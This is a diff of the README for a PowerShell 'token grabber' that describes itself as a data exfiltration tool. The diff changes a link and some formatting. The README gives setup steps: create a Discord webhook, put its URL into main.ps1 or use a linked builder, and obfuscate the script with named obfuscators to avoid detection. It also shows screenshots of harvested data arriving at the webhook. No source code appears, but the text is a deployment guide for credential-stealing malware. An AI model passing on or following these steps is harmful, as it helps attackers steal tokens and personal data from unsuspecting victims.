@@ -34,11 +34,11 @@ This tool is made for data exfiltration. All information collected is sent using
 - After creating a server go to ```Edit channel``` > ```Integrations``` > ```Webhooks``` > ```Create Webhook```
 - Copy the ```Webhook URL```
 - Download ```main.ps1``` 
-- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line ```26``` with your webhook or use the [builder](https://github.com/KDot227/Powershell-Token-Grabber/blob/main/builder.ps1).
+- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line ```26``` with your webhook or use the [builder](https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/tag/Builder).
 
 # Want to obfuscate the code ?
 Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
-Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat files 
+Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for ```.bat``` files 
 
 # Screenshots
   ## 🔨 Builder
@@ -52,10 +52,7 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
  ## 🔷 Webhook Data
 > ![screenshot](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/7830653b-1fbb-46e6-8c49-26883a3eb34f)
 
-
-
 > ![data](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/630ba5ab-09e4-4427-826a-f5461623cd54)
-
 
 #  Features
 - [x] GUI Builder
